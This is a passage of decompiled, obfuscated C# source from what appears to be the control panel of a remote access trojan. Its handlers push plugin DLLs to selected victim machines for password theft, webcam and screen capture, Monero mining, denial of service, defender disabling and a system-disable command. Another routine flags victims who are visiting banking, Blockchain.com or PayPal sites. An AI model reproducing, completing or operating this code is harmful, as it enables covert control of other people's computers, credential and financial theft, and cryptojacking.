		Settings6.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_31(object sender, EventArgs e)
	{
		pnlNav.Height = Toolbox5.Height;
		pnlNav.Top = Toolbox5.Top;
		Toolbox5.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = Passwords;
		Notf_pass.Hide();
	}

	public void method_32(object sender, EventArgs e)
	{
		Toolbox5.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_33(object sender, EventArgs e)
	{
		pnlNav.Height = About.Height;
		pnlNav.Top = About.Top;
		About.BackColor = Color.FromArgb(46, 51, 73);
		TabControl1.SelectedTab = Abouts;
	}

	public void method_34(object sender, EventArgs e)
	{
		About.BackColor = Color.FromArgb(24, 30, 54);
	}

	public void method_35(object sender, DataGridViewColumnEventArgs e)
	{
		if (e.Column.Index == 0)
		{
			if (e.Column.Width > 300)
			{
				e.Column.Width = 300;
			}
			if (e.Column.Width < 48)
			{
				e.Column.Width = 48;
			}
			L1.method_7((int)Math.Round((double)e.Column.Width * 0.67));
		}
	}

	public void method_36(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("FM.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: true);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_37(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("FMM.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void OmyUiVitod(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("cam.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_38(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("sc2.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	[Obsolete]
	public void method_39(object sender, EventArgs e)
	{
		try
		{
			if (Operators.CompareString(TextBox1.Text, null, TextCompare: false) != 0)
			{
				if (Operators.CompareString(Label1.Text, "Not connected", TextCompare: false) == 0)
				{
					try
					{
						PPP = Conversions.ToInteger(TextBox1.Text);
						S = new SK(PPP);
						Class6.jQbZimjGko("port", Conversions.ToString(PPP));
					}
					catch (Exception ex)
					{
						ProjectData.SetProjectError(ex);
						Exception prompt = ex;
						Interaction.MsgBox(prompt, MsgBoxStyle.Exclamation, "Sorry !!");
						ProjectData.ClearProjectError();
					}
					Class7.sk_0 = S;
					Thread thread = new Thread(dsk, 1);
					thread.Start();
					vmethod_2().Enabled = true;
					Label1.Text = "connected";
					TextBox1.Enabled = false;
					TextBox1.IconLeft = Resources.c;
					Class6.jQbZimjGko("#TextBox1", TextBox1.Text);
					PLW.Animated = true;
				}
			}
			else
			{
				Interaction.MsgBox("Please, Enter The Port", MsgBoxStyle.Exclamation, "Sorry !!");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_40(object sender, KeyPressEventArgs e)
	{
		try
		{
			if (!Versioned.IsNumeric(e.KeyChar))
			{
				e.Handled = true;
				Interaction.MsgBox("Please, Enter The Number", MsgBoxStyle.Exclamation, "Sorry !!");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void Form1_MouseMove(object sender, MouseEventArgs e)
	{
		TabControl1.Visible = true;
	}

	public void method_41(object sender, EventArgs e)
	{
		IEnumerator enumerator = null;
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Client client = (Client)dataGridViewRow.Tag;
				if (client != null)
				{
					Manager manager = (Manager)Class7.smethod_7("m" + client.ip());
					if (manager == null)
					{
						manager = new Manager
						{
							sk = client,
							Name = "m" + client.ip()
						};
						manager.Show();
					}
					else
					{
						manager.WindowState = FormWindowState.Minimized;
						manager.WindowState = FormWindowState.Normal;
					}
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_42(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("pw.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_43(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("Controll.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_44(object sender, EventArgs e)
	{
		string text = null;
		int num = L1.SelectedRows.Count - 1;
		for (int i = 0; i <= num; i++)
		{
			text = Conversions.ToString(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(text + "\r\n", RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(L1.SelectedRows[i].Cells[2].Value))))));
		}
		text = text.Trim();
		Class7.string_3 = text;
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("inff.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_45(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("Anti.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_46(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("VB.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_47(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("Def.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_48(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("cli.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_49(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("loc.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_50(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("Anx.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_51(object sender, EventArgs e)
	{
		IEnumerator enumerator = null;
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[1] { "R" }, null, null, null, IgnoreReturn: true);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_52(object sender, EventArgs e)
	{
		IEnumerator enumerator = null;
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[1] { "UX" }, null, null, null, IgnoreReturn: true);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_53(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("dos.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_54(object sender, EventArgs e)
	{
		if (MessageBox.Show("Do you want to disable the system? ?", "", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) != DialogResult.Yes)
		{
			return;
		}
		IEnumerator enumerator = null;
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(dataGridViewRow.Tag), null, "Send", new object[1] { "VR" }, null, null, null, IgnoreReturn: true);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_55(object sender, EventArgs e)
	{
	}

	public void method_56(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("XMR.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_57(object sender, CancelEventArgs e)
	{
	}

	public void method_58(object sender, EventArgs e)
	{
	}

	public void method_59(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("NGR.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_60(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("coc.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_61(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("tory.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_62(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("uns.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_63(object sender, EventArgs e)
	{
	}

	public void method_64(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("Act.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_65(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("TCP.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_66(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("MSG.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_67(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("Fun.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_68(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("SO.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_69(object sender, EventArgs e)
	{
		if (L1.SelectedRows.Count == 0)
		{
			return;
		}
		IEnumerator enumerator = null;
		Class7.Class9 object_ = Class7.smethod_5("HRR.dll", null);
		try
		{
			enumerator = L1.SelectedRows.GetEnumerator();
			while (enumerator.MoveNext())
			{
				DataGridViewRow dataGridViewRow = (DataGridViewRow)enumerator.Current;
				Class7.smethod_6((Client)dataGridViewRow.Tag, object_, bool_3: false);
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
	}

	public void method_70(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_71(object sender, EventArgs e)
	{
		Class7.class8_0.bool_5 = SCAUT.Checked;
		Class7.class8_0.string_0 = Conversions.ToString(SCI.SelectedIndex);
		Class7.class8_0.bool_6 = CAMAUT.Checked;
		Class7.class8_0.int_0 = CAMI.SelectedIndex;
		Class7.class8_0.bool_7 = MICAUT.Checked;
		Class7.class8_0.bool_2 = LOGCONNECTIONS.Checked;
		Class7.class8_0.dbhqxeFdq4 = LOGLERR.Checked;
		Class7.class8_0.bool_3 = LOGRERR.Checked;
		Class7.class8_0.bool_4 = LOGMSGS.Checked;
		Class7.class8_0.bool_1 = LOGLOGIN.Checked;
		Class7.class8_0.bool_0 = ShowAlert.Checked;
		Class7.class8_0.int_1 = MICI.SelectedIndex;
		Class7.class8_0.int_2 = scrI.SelectedIndex;
		Class7.class8_0.method_1();
	}

	public void method_72(object sender, EventArgs e)
	{
		try
		{
			int num = 0;
			int num2 = 0;
			int num3 = 0;
			int num4 = 0;
			int num5 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int i = 0; i <= num5; i++)
			{
				ListViewItem listViewItem = new ListViewItem();
				if (Operators.CompareString(L1.Rows[i].Cells[10].Value.ToString().Substring(0, 5), "Win 1", TextCompare: false) == 0)
				{
					listViewItem.ForeColor = Color.Aqua;
				}
				if (Operators.CompareString(L1.Rows[i].Cells[10].Value.ToString().Substring(0, 5), "Win 8", TextCompare: false) == 0)
				{
					listViewItem.ForeColor = Color.Orange;
				}
				if (Operators.CompareString(L1.Rows[i].Cells[10].Value.ToString().Substring(0, 5), "Win 7", TextCompare: false) == 0)
				{
					listViewItem.ForeColor = Color.LimeGreen;
				}
				if (Operators.CompareString(L1.Rows[i].Cells[10].Value.ToString().Substring(0, 5), "Win X", TextCompare: false) == 0)
				{
					listViewItem.ForeColor = Color.Red;
				}
				listViewItem.SubItems.Add(L1.Rows[i].Cells[4].Value.ToString());
				listViewItem.SubItems.Add(L1.Rows[i].Cells[2].Value.ToString());
				listViewItem.SubItems.Add(L1.Rows[i].Cells[10].Value.ToString());
				listViewItem.ImageIndex = 2;
				ListView1.Items.Add(listViewItem);
			}
			int num6 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int j = 0; j <= num6; j++)
			{
				if (Operators.CompareString(L1.Rows[j].Cells[10].Value.ToString().Substring(0, 5), "Win 1", TextCompare: false) == 0)
				{
					num++;
				}
			}
			Win10.Text = Conversions.ToString(num) + " PC+";
			num = 0;
			int num7 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int k = 0; k <= num7; k++)
			{
				if (Operators.CompareString(L1.Rows[k].Cells[10].Value.ToString().Substring(0, 5), "Win 8", TextCompare: false) == 0)
				{
					num2++;
				}
			}
			Win8.Text = Conversions.ToString(num2) + " PC+";
			num2 = 0;
			int num8 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int l = 0; l <= num8; l++)
			{
				if (Operators.CompareString(L1.Rows[l].Cells[10].Value.ToString().Substring(0, 5), "Win 7", TextCompare: false) == 0)
				{
					num3++;
				}
			}
			Win7.Text = Conversions.ToString(num3) + " PC+";
			num3 = 0;
			int num9 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int m = 0; m <= num9; m++)
			{
				if (Operators.CompareString(L1.Rows[m].Cells[10].Value.ToString().Substring(0, 5), "Win X", TextCompare: false) == 0)
				{
					num4++;
				}
			}
			Winxp.Text = Conversions.ToString(num4) + " PC+";
			num4 = 0;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_73(object sender, EventArgs e)
	{
		try
		{
			SCANN.Text = Conversions.ToString(ListView1.Items.Count) + " PC+";
			Guna2Button7.Text = Conversions.ToString(ListView2.Items.Count) + " PC+";
			try
			{
				int num = Conversions.ToInteger(Conversions.ToString(L1.RowCount));
				if (ListView1.Items.Count > num)
				{
					ListView1.Items.Clear();
				}
				if (ListView2.Items.Count > 999)
				{
					ListView2.Items.Clear();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			int num2 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int i = 0; i <= num2; i++)
			{
				if (Operators.CompareString(L1.Rows[i].Cells[14].Value.ToString().Substring(0, 4), "Bank", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem = new ListViewItem();
					listViewItem.ForeColor = Color.LimeGreen;
					listViewItem.SubItems.Add(L1.Rows[i].Cells[4].Value.ToString());
					listViewItem.SubItems.Add(L1.Rows[i].Cells[2].Value.ToString());
					listViewItem.SubItems.Add("www.Bank.com");
					listViewItem.ImageIndex = 1;
					ListView2.Items.Add(listViewItem);
				}
			}
			int num3 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int j = 0; j <= num3; j++)
			{
				if (Operators.CompareString(L1.Rows[j].Cells[14].Value.ToString().Substring(0, 4), "bank", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem2 = new ListViewItem();
					listViewItem2.ForeColor = Color.LimeGreen;
					listViewItem2.SubItems.Add(L1.Rows[j].Cells[4].Value.ToString());
					listViewItem2.SubItems.Add(L1.Rows[j].Cells[2].Value.ToString());
					listViewItem2.SubItems.Add("www.Bank.com");
					listViewItem2.ImageIndex = 1;
					ListView2.Items.Add(listViewItem2);
				}
			}
			int num4 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int k = 0; k <= num4; k++)
			{
				if (Operators.CompareString(L1.Rows[k].Cells[14].Value.ToString().Substring(0, 4), "WWW.bank.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem3 = new ListViewItem();
					listViewItem3.ForeColor = Color.LimeGreen;
					listViewItem3.SubItems.Add(L1.Rows[k].Cells[4].Value.ToString());
					listViewItem3.SubItems.Add(L1.Rows[k].Cells[2].Value.ToString());
					listViewItem3.SubItems.Add("www.Bank.com");
					listViewItem3.ImageIndex = 1;
					ListView2.Items.Add(listViewItem3);
				}
			}
			int num5 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int l = 0; l <= num5; l++)
			{
				if (Operators.CompareString(L1.Rows[l].Cells[14].Value.ToString().Substring(0, 14), "Blockchain.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem4 = new ListViewItem();
					listViewItem4.ForeColor = Color.Orange;
					listViewItem4.SubItems.Add(L1.Rows[l].Cells[4].Value.ToString());
					listViewItem4.SubItems.Add(L1.Rows[l].Cells[2].Value.ToString());
					listViewItem4.SubItems.Add("www.Blockchain.com");
					listViewItem4.ImageIndex = 1;
					ListView2.Items.Add(listViewItem4);
				}
			}
			int num6 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int m = 0; m <= num6; m++)
			{
				if (Operators.CompareString(L1.Rows[m].Cells[14].Value.ToString().Substring(0, 14), "WWW.Blockchain.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem5 = new ListViewItem();
					listViewItem5.ForeColor = Color.Orange;
					listViewItem5.SubItems.Add(L1.Rows[m].Cells[4].Value.ToString());
					listViewItem5.SubItems.Add(L1.Rows[m].Cells[2].Value.ToString());
					listViewItem5.SubItems.Add("www.Blockchain.com");
					listViewItem5.ImageIndex = 1;
					ListView2.Items.Add(listViewItem5);
				}
			}
			int num7 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int n = 0; n <= num7; n++)
			{
				if (Operators.CompareString(L1.Rows[n].Cells[14].Value.ToString().Substring(0, 14), "www.blockchain.com", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem6 = new ListViewItem();
					listViewItem6.ForeColor = Color.Orange;
					listViewItem6.SubItems.Add(L1.Rows[n].Cells[4].Value.ToString());
					listViewItem6.SubItems.Add(L1.Rows[n].Cells[2].Value.ToString());
					listViewItem6.SubItems.Add("www.Blockchain.com");
					listViewItem6.ImageIndex = 1;
					ListView2.Items.Add(listViewItem6);
				}
			}
			int num8 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num9 = 0; num9 <= num8; num9++)
			{
				if (Operators.CompareString(L1.Rows[num9].Cells[14].Value.ToString().Substring(0, 6), "paypal", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem7 = new ListViewItem();
					listViewItem7.ForeColor = Color.Orange;
					listViewItem7.SubItems.Add(L1.Rows[num9].Cells[4].Value.ToString());
					listViewItem7.SubItems.Add(L1.Rows[num9].Cells[2].Value.ToString());
					listViewItem7.SubItems.Add("www.Paypal.com");
					listViewItem7.ImageIndex = 1;
					ListView2.Items.Add(listViewItem7);
				}
			}
			int num10 = Conversions.ToInteger(Operators.SubtractObject(L1.Rows.Count, Interaction.IIf(L1.AllowUserToAddRows, 2, 1)));
			for (int num11 = 0; num11 <= num10; num11++)
			{
				if (Operators.CompareString(L1.Rows[num11].Cells[14].Value.ToString().Substring(0, 6), "PayPal", TextCompare: false) == 0)
				{
					NONN.Visible = true;
					ListViewItem listViewItem8 = new ListViewItem();
